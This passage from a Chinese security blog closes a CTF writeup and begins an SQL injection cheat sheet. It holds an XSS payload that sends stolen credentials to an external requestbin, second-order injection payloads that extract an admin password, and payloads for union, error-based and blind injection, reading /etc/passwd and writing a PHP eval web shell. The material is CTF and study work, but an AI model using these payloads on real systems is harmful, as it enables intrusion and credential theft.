<p>于是尝试盗取管理员Cookie，但是发现存在CSP，不能引入外部js:<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303161104805.png" alt="在这里插入图片描述"><br>于是查看./js/login,.s文件：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303161209489.png" alt="在这里插入图片描述"><br>发现记住密码功能会从Cookie中提取用户名和密码，并赋给username和password，于是我们可以利用这个内部js构造如下payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">inpcookieut</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">inpcookieut</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scricookiept</span> <span class="attr">scookierc</span>=<span class="string">"./js/login.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scricookiept</span>&gt;</span></span><br><span class="line">	var uname = documcookieent.getElemcookieentsByName("username")[0].value;</span><br><span class="line">	var passwd = documcookieent.getElemcookieentsByName("password")[0].value;</span><br><span class="line">	var res = uname + " " + passwd;</span><br><span class="line">	documcookieent.locacookietion="http://http.requestbin.buuoj.cn/10l5f0o1?a="+res;</span><br><span class="line"><span class="tag">&lt;/<span class="name">scricookiept</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们利用buuctf提供的requestbin进行接收，也可以利用vps接收。</p>
<p>提交之后等待管理员点击即可，密码就是flag:<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303183645844.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>进入页面后，首先注册并登录进去，只有一个上传功能，我们看到url中有 <code>page=index</code>参数，于是尝试一下文件包含，但是提示不是admin：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303192230409.png" alt="在这里插入图片描述"><br>于是我们来看这个上传功能，虽然可以上传php文件，但是并没有给出路径，而且上传后会回显文件名，和RCTF 2015 upload一题很类似，于是我们尝试利用文件名进行二次注入。</p>
<p>首先测试一下过滤了哪些东西，随便上传一个文件然后抓包改文件名：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303193417110.png" alt="在这里插入图片描述"><br>从文件名可以看到除了or以外都被替换为空了：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303193446781.png" alt="在这里插入图片描述"><br>除此之外还过滤了一些其他关键词，不过经测试都可以用双写来绕过的，空格用嵌套括号绕过。</p>
<p>于是我们先构造一个payload如下，原理可以参考我RCTF那道题的<a href="https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/#upload%EF%BC%88rctf-2015%EF%BC%89">Writeup</a>。<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">'+(selselectect(conv(hex(substr(database(),<span class="number">1</span>,<span class="number">5</span>)),<span class="number">16</span>,<span class="number">10</span>)))+'</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303200441384.png" alt="在这里插入图片描述"><br>可以看到文件名返回了一串10进制，转16进制再转字符得到：<code>bytect</code>。<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303200520665.png" alt="在这里插入图片描述"><br>然后修改substr截取的位置，得到数据库名：<code>bytectf</code>。<br>（之所以要一段一段读是因为如果一次读太多的话会用科学计数法表示，就无法转回字符串了。）</p>
<p>用上述思路，我们可以一步步注入出管理员的密码：</p>
<p>表名payload：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">'+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(table_name))frfromom(information_schema.tables)whewherere(table_schema='bytectf')),<span class="number">1</span>,<span class="number">5</span>)),<span class="number">16</span>,<span class="number">10</span>)))+'</span><br></pre></td></tr></table></figure></p>
<p>依次移动截取的位置得到：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303200948187.png" alt="在这里插入图片描述"><br>转字符串得到：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303201021978.png" alt="在这里插入图片描述"><br>字段名注入类似，共有id、username、password、ip、admin五列。</p>
<p>最后我们可以用如下payload得到管理员密码：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">'+(selselectect(conv(hex(substr((selselectect(grogroupup_conconcatcat(password))frfromom(byte_user)whewherere(username='admin')),<span class="number">1</span>,<span class="number">5</span>)),<span class="number">16</span>,<span class="number">10</span>)))+'</span><br></pre></td></tr></table></figure>
<p>不断拼接并转码得到md5：<code>3814d79033f6fc9c1d3cf002a1f92100</code><br>在线网站可得到明文密码：<code>kotori912</code></p>
<p>成功登录admin账户：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303202421703.png" alt="在这里插入图片描述"><br>下面我们就先再试一下文件包含，获得提示：<code>You can try to read picture file.</code></p>
<p>尝试上传文件发现会显示<code>illegal ip</code>，但是Cookie里包含了cipher、plain、encrypt三个字段：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303203325621.png" alt="在这里插入图片描述"><br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">cipher</span>=ZGRkZGhtZGRkZGhtT3J6MAQMOJb//iirvKap+mfDh7hTUOCjShL6T4pmnpOotVOJ</span><br><span class="line"><span class="attr">plain</span>=eyJpc19hZG1pbiI6dHJ1ZSwiaXAiOmZhbHNlfQ==</span><br><span class="line"><span class="attr">encrypt</span>=cbc</span><br><span class="line"><span class="attr">IV</span>=ZGRkZGhtZGRkZGht</span><br></pre></td></tr></table></figure></p>
<p>plain直接base64解密得到：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"is_admin"</span>:<span class="literal">true</span>,<span class="attr">"ip"</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>再结合cbc的提示，判断利用CBC字节翻转攻击将将ip的值转为true。</p>
<p>然后。。</p>
<p>然后就卡住了，一直没有成功..太菜了。。等之后密码学好一点再来分析</p>
<p><br></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入总结</title>
    <url>/2019/07/16/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>自己的总结加上搜集网上各路大牛的方法，应该还算比较全了。<br><a href="http://p0desta.com/" target="_blank" rel="noopener">p0desta‘s Blog</a><br><br></p>
<h2 id="一、基本知识"><a href="#一、基本知识" class="headerlink" title="一、基本知识"></a>一、基本知识</h2><h3 id="1、常用函数"><a href="#1、常用函数" class="headerlink" title="1、常用函数"></a>1、常用函数</h3><h6 id="（1）查看当前数据库版本"><a href="#（1）查看当前数据库版本" class="headerlink" title="（1）查看当前数据库版本"></a>（1）查看当前数据库版本</h6><ul>
<li>version()</li>
<li>@@version</li>
<li>@@global.version</li>
</ul>
<h6 id="（2）查看当前登陆用户"><a href="#（2）查看当前登陆用户" class="headerlink" title="（2）查看当前登陆用户"></a>（2）查看当前登陆用户</h6><ul>
<li>user()</li>
<li>current_user()</li>
<li>system_user()</li>
<li>session_user()</li>
</ul>
<h6 id="（3）当前使用的数据库"><a href="#（3）当前使用的数据库" class="headerlink" title="（3）当前使用的数据库"></a>（3）当前使用的数据库</h6><ul>
<li>database()</li>
<li>schema()</li>
</ul>
<h6 id="（4）路径查询"><a href="#（4）路径查询" class="headerlink" title="（4）路径查询"></a>（4）路径查询</h6><ul>
<li>@@basedir ——mysql安装路径 </li>
<li>@@slave_load_tampdir ——临时文件夹路径</li>
<li>@@datadir ——数据存储路径</li>
<li>@@character_sets_dir ——字符集设置文件路径</li>
<li>@@log_error ——错误日志文件路径</li>
<li>@@pid_file ——pid-file文件路径</li>
</ul>
<h6 id="（5）字符串连接函数"><a href="#（5）字符串连接函数" class="headerlink" title="（5）字符串连接函数"></a>（5）字符串连接函数</h6><ul>
<li>group_concat() ——返回一个字符串结果，该结果由分组中的值连接组合而成。<code>group_concat([DISTINCT] 要连接的字段[Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></li>
<li>concat() ——将多个字符串连接成一个字符串，<code>CONCAT(str1,str2,…)</code></li>
<li>concat_ws() ——有分隔符的字符串连接,<code>CONCAT_WS(separator,str1,str2,…)</code></li>
</ul>
<h6 id="（6）盲注常用函数"><a href="#（6）盲注常用函数" class="headerlink" title="（6）盲注常用函数"></a>（6）盲注常用函数</h6><ul>
<li>length(str) ——返回字符串str的长度</li>
<li>mid(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
<li>substr(str, start [,length]) ——从字符串str的start(从1开始)位置开始返回长的为length的部分</li>
<li>left(str, length) ——返回具有指定长度的字符串的左边部分</li>
<li>ord()  ——返回字符串第一个字符的 ASCII 值</li>
<li>ascii() ——返回字符串第一个字符的 ASCII 值</li>
</ul>
<h6 id="（7）Time-Based常用函数"><a href="#（7）Time-Based常用函数" class="headerlink" title="（7）Time-Based常用函数"></a>（7）Time-Based常用函数</h6><ul>
<li>BENCHMARK(count,expr)   ——重复count次执行表达式expr</li>
<li>sleep(n) ——暂停数据库n秒</li>
<li>if(expr1,expr2,expr3) ——如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值</li>
</ul>
<h6 id="（8）Wrong-Based常用函数"><a href="#（8）Wrong-Based常用函数" class="headerlink" title="（8）Wrong-Based常用函数"></a>（8）Wrong-Based常用函数</h6><ul>
<li>rand(int) ——以int为种子生成伪随机数</li>
<li>floor() ——返回小于等于该值的最大整数</li>
<li>count() ——统计个数</li>
<li>updatexml()</li>
</ul>
<blockquote>
<p><strong>updatexml()函数</strong><br><br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据  <br><br> <strong>作用</strong>： 改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
</blockquote>
<p>例如，<code>updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);</code><br>由于<code>updatexml()</code>的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，其中的<code>concat()</code>函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
<h6 id="（9）其他函数"><a href="#（9）其他函数" class="headerlink" title="（9）其他函数"></a>（9）其他函数</h6><ul>
<li>bin() ——返回值的二进制表示</li>
<li>conv(str,m,n) ——进制转换，将str从m进制转换为n进制</li>
<li>lower() ——转成小写字母</li>
<li>upper() ——转成大写字母</li>
<li>hex() ——十六进制编码</li>
<li>unhex() ——十六进制解码</li>
</ul>
<p><br></p>
<h3 id="2、常用语句及方法"><a href="#2、常用语句及方法" class="headerlink" title="2、常用语句及方法"></a>2、常用语句及方法</h3><h5 id="（1）Mysql常用语句"><a href="#（1）Mysql常用语句" class="headerlink" title="（1）Mysql常用语句"></a>（1）Mysql常用语句</h5><h6 id="所有用户："><a href="#所有用户：" class="headerlink" title="所有用户："></a>所有用户：</h6><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(<span class="keyword">user</span>) <span class="keyword">from</span> mysql.<span class="keyword">user</span></span><br></pre></td></tr></table></figure>
<h6 id="用户hash："><a href="#用户hash：" class="headerlink" title="用户hash："></a>用户hash：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span></span><br></pre></td></tr></table></figure>
<h6 id="所有数据库："><a href="#所有数据库：" class="headerlink" title="所有数据库："></a>所有数据库：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
<h6 id="表名："><a href="#表名：" class="headerlink" title="表名："></a>表名：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure>
<h6 id="表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出"><a href="#表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出" class="headerlink" title="//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出"></a>//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.table_constraints <span class="keyword">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure>
<h6 id="字段名："><a href="#字段名：" class="headerlink" title="字段名："></a>字段名：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'表名'</span></span><br></pre></td></tr></table></figure>
<h6 id="读文件："><a href="#读文件：" class="headerlink" title="读文件："></a>读文件：</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>)</span><br></pre></td></tr></table></figure>
<h6 id="写文件："><a href="#写文件：" class="headerlink" title="写文件："></a>写文件：</h6><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">SELECT</span> <span class="string">'&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[1]);?&gt;'</span> into outfile <span class="string">'/var/www/html/shell.php'</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="（2）UNION注入"><a href="#（2）UNION注入" class="headerlink" title="（2）UNION注入"></a>（2）UNION注入</h5><h6 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h6><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span> %<span class="number">23</span></span><br><span class="line"><span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> %<span class="number">23</span></span><br><span class="line"><span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> %<span class="number">23</span></span><br><span class="line">·····</span><br><span class="line"><span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> n %<span class="number">23</span></span><br><span class="line"></span><br><span class="line">直到报错为止，最后一个页面正确回显的数，即为列数</span><br></pre></td></tr></table></figure>
<h6 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h6><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">-1</span>' UNION SELECT <span class="number">1</span>,<span class="number">2</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>然后在可回显的位置处构造SQL语句进行注入<br><br></p>
<h5 id="（2）报错注入"><a href="#（2）报错注入" class="headerlink" title="（2）报错注入"></a>（2）报错注入</h5><h6 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">OR</span> (SELECT 8627 <span class="keyword">FROM</span>(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)<span class="number">*2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS<span class="built_in"> GROUP </span>BY x)a)</span><br></pre></td></tr></table></figure>
<h6 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h6><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">extractvalue</span>(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> @<span class="title">@version</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
<h6 id="UpdateXml-有长度限制-最长32位"><a href="#UpdateXml-有长度限制-最长32位" class="headerlink" title="UpdateXml(有长度限制,最长32位)"></a>UpdateXml(有长度限制,最长32位)</h6><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT @@version),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h6 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h6><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">or</span> 1<span class="built_in"> group </span>by concat_ws(0x7e,version(),floor(rand(0)<span class="number">*2</span>)) having min(0) <span class="keyword">or</span> 1</span><br></pre></td></tr></table></figure>
<h6 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h6><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> (<span class="built_in">select</span> <span class="built_in">exp</span>(~(<span class="built_in">select</span> * <span class="built_in">from</span>(<span class="built_in">select</span> <span class="built_in">user</span>())<span class="built_in">x</span>)))</span><br></pre></td></tr></table></figure>
<h6 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h6><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users where username=""and polygon (password);</span><br><span class="line"><span class="keyword">ERROR </span>1367 (22007): Illegal non geometric '`security`.`users`.`password`' value found during parsing</span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="（3）bool盲注"><a href="#（3）bool盲注" class="headerlink" title="（3）bool盲注"></a>（3）bool盲注</h5><p>对于盲注，常常需要写脚本来进行注入<br>可参考：<a href="https://lethe.site/2019/03/02/%E4%BB%A5dvwa%E4%B8%BA%E4%BE%8B%E5%AD%A6%E4%B9%A0%E7%AE%80%E5%8D%95sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%AF%A6%E7%BB%86%E8%84%9A%E6%9C%AC/">以dvwa为例简单bool盲注脚本</a><br>payload：<br><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</span></span><br><span class="line"><span class="comment">// k ，结合limit，选择偏移为k的行</span></span><br><span class="line"><span class="comment">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</span></span><br><span class="line"><span class="comment">// SUBSTR() 也可以换成 SUBSTRING()</span></span><br><span class="line"></span><br><span class="line">' <span class="keyword">OR</span> (<span class="built_in">SELECT</span> <span class="built_in">ASCII</span>(<span class="built_in">SUBSTR</span>(<span class="built_in">DATABASE</span>(),i,<span class="number">1</span>) ) &lt; j) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line">' <span class="keyword">OR</span> (<span class="built_in">SELECT</span> <span class="built_in">ASCII</span>(<span class="built_in">SUBSTR</span>((<span class="built_in">SELECT</span> <span class="built_in">GROUP_CONCAT</span>(schema_name SEPARATOR <span class="number">0x3c62723e</span>) FROM INFORMATION_SCHEMA.SCHEMATA),i,<span class="number">1</span>) ) &lt; j) <span class="meta">#  </span></span><br><span class="line"></span><br><span class="line">' <span class="keyword">OR</span> (<span class="built_in">SELECT</span> <span class="built_in">SUBSTR</span>(<span class="built_in">DATABASE</span>(),i,<span class="number">1</span>) &lt; j) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line">' <span class="keyword">OR</span> (<span class="built_in">SELECT</span> <span class="built_in">SUBSTR</span>((<span class="built_in">SELECT</span> <span class="built_in">GROUP_CONCAT</span>(schema_name SEPARATOR <span class="number">0x3c62723e</span>) FROM INFORMATION_SCHEMA.SCHEMATA),i,<span class="number">1</span>) &lt; j) <span class="meta">#  </span></span><br><span class="line"></span><br><span class="line">' <span class="keyword">OR</span> <span class="built_in">SUBSTR</span>((<span class="built_in">SELECT</span> schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,<span class="number">1</span>),i,<span class="number">1</span>) &lt; j <span class="meta">#</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h5 id="（4）时间盲注"><a href="#（4）时间盲注" class="headerlink" title="（4）时间盲注"></a>（4）时间盲注</h5><h6 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h6><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> OR SLEEP(<span class="number">25</span>)=<span class="number">0</span> LIMIT <span class="number">1</span> #</span><br><span class="line"><span class="number">1</span>) OR SLEEP(<span class="number">25</span>)=<span class="number">0</span> LIMIT <span class="number">1</span> #</span><br><span class="line"><span class="number">1</span>' OR SLEEP(<span class="number">25</span>)=<span class="number">0</span> LIMIT <span class="number">1</span> #</span><br><span class="line">') OR SLEEP(<span class="number">25</span>)=<span class="number">0</span> LIMIT <span class="number">1</span> #</span><br><span class="line"><span class="number">1</span>)) OR SLEEP(<span class="number">25</span>)=<span class="number">0</span> LIMIT <span class="number">1</span> #</span><br><span class="line">SELECT SLEEP(<span class="number">25</span>) #</span><br></pre></td></tr></table></figure>
<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">UNION SELECT IF(<span class="name">SUBSTR</span>((<span class="name">SELECT</span> GROUP_CONCAT(<span class="name">schema_name</span> SEPARATOR <span class="number">0</span>x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,<span class="number">1</span>) &lt; j,BENCHMARK(<span class="number">100000</span>,SHA1(<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">UNION SELECT IF(<span class="name">SUBSTR</span>((<span class="name">SELECT</span> GROUP_CONCAT(<span class="name">schema_name</span> SEPARATOR <span class="number">0</span>x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,<span class="number">1</span>) &lt; j,SLEEP(<span class="number">10</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><br></p>
<h5 id="（5）Insert-Update注入"><a href="#（5）Insert-Update注入" class="headerlink" title="（5）Insert / Update注入"></a>（5）Insert / Update注入</h5><p>insert和update一般使用报错注入，如果没有错误回显，insert可以使用延时注入，update可以使用bool盲注和延时盲注。</p>
<p>如果存在<code>insert</code>或者<code>update</code>，更新后的数据是可见的话,那么利用mysql的隐式类型转换，其实就是当字符串与整数相加时，会当作整数来解释，如下：<br><img src="/2019/07/16/SQL注入总结/1.png" alt="在这里插入图片描述"></p>
<p>那么我们可以利用查询的数据转化为<strong>10进制</strong>,然后进行运算,拿到我们计算的结果,在进行转化回去即可。<br>（可参考RCTF 2015 upload一题）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update users set password=&apos;&apos;+conv(hex(substr(user(),1 + (1-1) * 8, 6)), 16, 10);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">| id | username | password        |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">|  1 | admin    | 125822936825964 |</span><br><span class="line">+----+----------+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(conv(125822936825964, 10 ,16));</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| unhex(conv(125822936825964, 10 ,16)) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| root@l                               |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h5 id="（6）表名可控注入"><a href="#（6）表名可控注入" class="headerlink" title="（6）表名可控注入"></a>（6）表名可控注入</h5><h6 id="表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/16/SQL注入总结/2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">desc `shop_users` `where updatexml(<span class="number">1</span>,concat(<span class="number">0x5e24</span>,(select user()),<span class="number">0x5e24</span>),<span class="number">1</span>)#`</span><br></pre></td></tr></table></figure></p>
<h6 id="表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc shop_&#123;$table&#125;"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line">$sql = <span class="string">"select * from `shop_&#123;$table&#125;` where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/16/SQL注入总结/3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
<h5 id="（7）无列名注入"><a href="#（7）无列名注入" class="headerlink" title="（7）无列名注入"></a>（7）无列名注入</h5><h6 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h6><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> (<span class="title">select</span> 1,2,<span class="title">c</span> <span class="title">from</span> (<span class="title">select</span> 1,2 <span class="title">c</span> <span class="title">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">flag</span>)<span class="title">b</span>) <span class="title">limit</span> 1,1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/07/16/SQL注入总结/4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者</p>
